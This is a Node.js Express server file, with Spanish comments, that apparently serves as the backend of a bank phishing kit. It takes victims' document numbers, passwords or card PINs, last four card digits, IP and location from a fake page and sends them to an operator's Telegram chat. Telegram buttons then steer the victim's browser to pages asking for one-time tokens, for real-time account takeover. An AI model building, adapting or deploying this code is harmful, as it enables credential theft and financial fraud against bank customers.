// server.js
const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");
const cors = require("cors");
const { v4: uuidv4 } = require("uuid");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 3000;

// 🧠 Memoria temporal para almacenar sesiones
const sessions = new Map();

app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// 📩 Ruta de recepción desde persona.html
app.post("/virtualpersona", async (req, res) => {
  const {
    tipoIngreso,
    tipoDocumento,
    numeroDocumento,
    clave,
    ultimos4,
    ip,
    location
  } = req.body;

  const sessionId = uuidv4();

  // Guardar en memoria
  sessions.set(sessionId, { redirect_to: null });

  // Construir mensaje Telegram
  let mensaje = `🔐 *Ingreso cliente:* ${tipoIngreso}\n📄 *Tipo Documento:* ${tipoDocumento}\n🆔 *Número Documento:* ${numeroDocumento}\n`;

  if (tipoIngreso === "Zona segura") {
    mensaje += `🔑 *Clave segura:* ${clave}\n`;
  } else {
    mensaje += `💳 *Clave tarjeta:* ${clave}\n💠 *Últimos 4:* ${ultimos4}\n`;
  }

  if (ip || location) {
    mensaje += `🌐 *IP:* ${ip || "N/D"}\n📍 *Ubicación:* ${location || "N/D"}\n`;
  }

  mensaje += `🪪 *Session ID:* \`${sessionId}\``;

  const botones = {
  inline_keyboard: [
    [
      { text: "❌ Error Logo", callback_data: `rechazar_${sessionId}` },     // 👉 Volver al inicio
      { text: "🔁 Pedir token", callback_data: `volver_${sessionId}` },      // 👉 Ir a OTP1
      { text: "❌ Error Token", callback_data: `continuar_${sessionId}` }    // 👉 Ir a OTP2
    ]
  ]
};


  try {
    await axios.post(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
      chat_id: process.env.CHAT_ID,
      text: mensaje,
      parse_mode: "Markdown",
      reply_markup: botones
    });

    return res.status(200).json({ ok: true, sessionId });
  } catch (error) {
    console.error("Error enviando a Telegram:", error.message);
    return res.status(500).json({ error: "No se pudo enviar a Telegram" });
  }
});

// 🎯 Webhook para manejar botones de Telegram
app.post("/telegram/webhook", async (req, res) => {
  const callback = req.body.callback_query;
  if (!callback) return res.sendStatus(200);

  const data = callback.data;
  const chatId = callback.message.chat.id;

  const [accion, sessionId] = data.split("_");

  let textoRespuesta = "";

  switch (accion) {
    case "rechazar":
      sessions.set(sessionId, { redirect_to: "inicio" });  // ← vuelve al principio
      textoRespuesta = "🔄 Cliente debe volver al inicio.";
      break;
    case "volver":
      sessions.set(sessionId, { redirect_to: "otp1" });    // ← enviar a otp1
      textoRespuesta = "🔑 Solicitar token al cliente (OTP 1).";
      break;
    case "continuar":
      sessions.set(sessionId, { redirect_to: "otp2" });    // ← enviar a otp2
      textoRespuesta = "⚠️ Token incorrecto. Ir a OTP 2.";
      break;
    default:
      textoRespuesta = "Acción no reconocida.";
  }

  await axios.post(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/answerCallbackQuery`, {
    callback_query_id: callback.id,
    text: textoRespuesta,
    show_alert: false
  });

  return res.sendStatus(200);
});


// 🔁 Endpoint para polling del frontend
app.get("/instruction/:sessionId", (req, res) => {
  const sessionId = req.params.sessionId;
  const session = sessions.get(sessionId);

  if (!session) {
    return res.status(404).json({ error: "Sesión no encontrada" });
  }

  return res.json(session);
});

app.listen(PORT, () => {
  console.log(`Servidor funcionando en http://localhost:${PORT}`);
});
